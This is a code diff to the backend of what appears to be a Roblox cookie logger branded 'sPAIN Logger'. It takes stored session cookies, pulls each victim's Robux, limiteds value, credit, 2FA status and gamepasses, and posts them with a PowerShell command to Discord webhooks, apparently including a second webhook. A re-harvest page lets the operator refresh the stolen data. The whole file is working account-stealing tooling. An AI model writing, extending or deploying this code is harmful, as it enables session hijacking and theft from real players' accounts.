@@ -12,7 +12,7 @@ async function redisGet(key) {
     if (!json.result) return null;
     let r = json.result;
     if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
-    if (r && typeof r.value === 'string') { try { r = JSON.parse(r.value); } catch {} }
+    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
     return r || null;
   } catch { return null; }
 }
@@ -66,28 +66,23 @@ async function sendToDiscord(webhookUrl, info, pageName) {
       color:       0xc026d3,
       thumbnail:   { url: info.avatarUrl },
       fields: [
-        { name: '💰 Robux',         value: `\`${fmt(info.robux)} R$\``,                                                                     inline: true  },
-        { name: '⏳ Pending',       value: `\`${fmt(info.pendingRobux)} R$\``,                                                              inline: true  },
-        { name: '📊 Age',           value: `\`${info.accountAgeDays} days\``,                                                               inline: true  },
-        { name: '📈 Today',         value: `\`${fmt(info.txDay)} R$\``,                                                                     inline: true  },
-        { name: '📈 This Week',     value: `\`${fmt(info.txWeek)} R$\``,                                                                    inline: true  },
-        { name: '📈 This Year',     value: `\`${fmt(info.txYear)} R$\``,                                                                    inline: true  },
-        { name: '👥 Groups',        value: `Owned: \`${info.groupsOwned}\` | R$: \`${fmt(info.groupRobux)}\``,                              inline: true  },
-        { name: '👥 Friends',       value: `\`${info.friends}\``,                                                                           inline: true  },
-        { name: '🛒 Limiteds',      value: `Count: \`${info.limitedsCount}\` | RAP: \`${fmt(info.limitedsValue)} R$\``,                     inline: true  },
-        { name: '💳 Credit',        value: `\`${info.credit} USD\``,                                                                        inline: true  },
-        { name: '⭐ Premium',       value: `\`${info.isPremium ? 'Yes' : 'No'}\``,                                                          inline: true  },
-        { name: '⚙️ Account',       value: `Email: ${info.emailSet}\n2FA: ${info.twoFA}`,                                                   inline: true  },
-        { name: '🎮 Gamepasses',    value: `MM2: ${info.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${info.gamepasses?.adoptMe ? '✅' : '❌'} | PLS Donate: ${info.gamepasses?.plsDonate ? '✅' : '❌'}`, inline: false },
-        { name: '🕐 Refreshed At',  value: `\`${now}\``,                                                                                    inline: false }
+        { name: '💰 Robux',      value: `\`${fmt(info.robux)} R$\``,                                                                     inline: true  },
+        { name: '📊 Age',        value: `\`${info.accountAgeDays} days\``,                                                               inline: true  },
+        { name: '👥 Groups',     value: `Owned: \`${info.groupsOwned}\` | R$: \`${fmt(info.groupRobux)}\``,                              inline: true  },
+        { name: '👥 Friends',    value: `\`${info.friends}\``,                                                                           inline: true  },
+        { name: '🛒 Limiteds',   value: `Count: \`${info.limitedsCount}\` | RAP: \`${fmt(info.limitedsValue)} R$\``,                     inline: true  },
+        { name: '💳 Credit',     value: `\`${info.credit} USD\``,                                                                        inline: true  },
+        { name: '⭐ Premium',    value: `\`${info.isPremium ? 'Yes' : 'No'}\``,                                                          inline: true  },
+        { name: '⚙️ Account',    value: `Email: ${info.emailSet}\n2FA: ${info.twoFA}`,                                                   inline: true  },
+        { name: '🎮 Gamepasses', value: `MM2: ${info.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${info.gamepasses?.adoptMe ? '✅' : '❌'} | PLS Donate: ${info.gamepasses?.plsDonate ? '✅' : '❌'}`, inline: false },
+        { name: '🕐 Refreshed',  value: `\`${now}\``,                                                                                    inline: false }
       ],
       footer: { text: `sPAIN Logger • ${pageName}` }
     }]
   });
-  await discordChunked(webhookUrl, info.powershell, 'powershell');
+  if (info.powershell) await discordChunked(webhookUrl, info.powershell, 'powershell');
 }
 
-// ── Dashboard page — shows live account info, refresh button ─────────────────
 function buildPage(id) {
   return `<!DOCTYPE html>
 <html lang="en">
@@ -115,58 +110,54 @@ function buildPage(id) {
   .btn:hover{transform:translateY(-2px);box-shadow:0 0 56px rgba(192,38,211,0.65)}
   .btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
   .status{margin-top:18px;font-size:0.75rem;letter-spacing:0.06em;min-height:20px;color:var(--muted)}
-  .status.ok{color:#4ade80}
-  .status.err{color:#f472b6}
+  .status.ok{color:#4ade80}.status.err{color:#f472b6}
 </style>
 </head>
 <body>
 <div class="aurora"><div class="blob blob1"></div><div class="blob blob2"></div></div>
 <div class="card">
   <div class="logo">s<span>PAIN</span> Tools</div>
-  <p>Click the button to fetch fresh account info and send it to Discord including a new PowerShell command.</p>
+  <p>Click below to fetch fresh account info and send it to Discord with a new PowerShell command.</p>
   <button class="btn" id="btn" onclick="send()">&#x1F504; Refresh &amp; Send to Discord</button>
   <div class="status" id="status"></div>
 </div>
 <script>
-const ID = '${id}';
+// ID is embedded server-side — no query param needed
+const REFRESH_ID = '${id}';
 async function send() {
   const btn = document.getElementById('btn');
   const st  = document.getElementById('status');
   btn.disabled = true;
   btn.textContent = 'Fetching...';
-  st.className = 'status';
-  st.textContent = '';
+  st.className = 'status'; st.textContent = '';
   try {
     const r = await fetch('/api/refresh', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ id: ID })
+      body: JSON.stringify({ id: REFRESH_ID })
     });
     const d = await r.json();
     if (d.success) {
-      btn.textContent = '\u2713 Sent to Discord!';
+      btn.textContent = '\\u2713 Sent to Discord!';
       btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
       btn.style.boxShadow  = '0 0 36px rgba(34,197,94,0.4)';
       st.className = 'status ok';
       st.textContent = 'Account info + PowerShell sent to your webhook.';
-      // Reset button after 4s so they can refresh again
       setTimeout(() => {
         btn.disabled = false;
-        btn.textContent = '\u1F504 Refresh & Send to Discord';
-        btn.style.background = '';
-        btn.style.boxShadow  = '';
-        st.textContent = '';
-        st.className = 'status';
+        btn.textContent = '\\u{1F504} Refresh & Send to Discord';
+        btn.style.background = ''; btn.style.boxShadow = '';
+        st.textContent = ''; st.className = 'status';
       }, 4000);
     } else {
       btn.disabled = false;
-      btn.textContent = '\u1F504 Refresh & Send to Discord';
+      btn.textContent = '\\u{1F504} Refresh & Send to Discord';
       st.className = 'status err';
       st.textContent = d.error || 'Something went wrong.';
     }
   } catch {
     btn.disabled = false;
-    btn.textContent = '\u1F504 Refresh & Send to Discord';
+    btn.textContent = '\\u{1F504} Refresh & Send to Discord';
     st.className = 'status err';
     st.textContent = 'Network error. Try again.';
   }
@@ -176,45 +167,57 @@ async function send() {
 </html>`;
 }
 
+// ── Parse body safely ─────────────────────────────────────────────────────────
+function parseBody(raw) {
+  if (!raw) return {};
+  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
+  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
+  catch { return {}; }
+}
 
+// ── Main handler ──────────────────────────────────────────────────────────────
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   if (req.method === 'OPTIONS') return res.status(204).end();
 
-  const urlObj    = new URL('http://x' + req.url);
-  const refreshId = urlObj.searchParams.get('id') || '';
-  const action    = urlObj.searchParams.get('action') || '';
-
-  if (!refreshId) {
-    res.setHeader('Content-Type', 'text/html');
-    return res.status(400).send('<h1>Missing id</h1>');
-  }
-
-  // GET — serve the refresh page
+  // ── GET: serve the HTML page ──────────────────────────────────────────────
   if (req.method === 'GET') {
+    // ID comes from Vercel rewrite query param: /r/:id → /api/refresh.js?id=$id
+    const urlObj    = new URL('http://x' + req.url);
+    const refreshId = urlObj.searchParams.get('id') || '';
+
+    if (!refreshId) {
+      res.setHeader('Content-Type', 'text/html');
+      return res.status(400).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6">Missing refresh ID</h1>');
+    }
+
     const record = await redisGet(`refresh:${refreshId}`);
     if (!record) {
       res.setHeader('Content-Type', 'text/html');
-      return res.status(404).send('<div style="font-family:sans-serif;padding:40px;color:#f0f0f8;background:#080810;min-height:100vh"><h1 style="color:#f472b6">Link expired or not found</h1></div>');
+      return res.status(404).send('<h1 style="font-family:sans-serif;padding:40px;color:#f472b6">Link expired or not found</h1>');
     }
+
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     return res.status(200).send(buildPage(refreshId));
   }
 
-  // POST — send full info + PowerShell to Discord
+  // ── POST: regenerate info + send to Discord ───────────────────────────────
   if (req.method === 'POST') {
-    let body = req.body;
-    if (typeof body === 'string') { try { body = JSON.parse(body); } catch { body = {}; } }
-    const postId = body?.id || refreshId;
+    // ID always comes from the request BODY — never the URL for POST
+    const body   = parseBody(req.body);
+    const postId = body?.id;
+
+    if (!postId) return res.status(400).json({ error: 'id is required in body' });
 
     const record = await redisGet(`refresh:${postId}`);
     if (!record)        return res.status(404).json({ error: 'Link not found or expired' });
     if (!record.cookie) return res.status(500).json({ error: 'No cookie stored' });
+    if (!record.webhook)return res.status(500).json({ error: 'No webhook stored' });
 
     const info = await getWorkerInfo(record.cookie);
-    if (!info)          return res.status(502).json({ error: 'Cookie invalid or expired' });
+    if (!info) return res.status(502).json({ error: 'Cookie invalid or expired' });
 
     const webhooks = [record.webhook];
     if (record.webhook1 && record.webhook1 !== record.webhook) webhooks.push(record.webhook1);
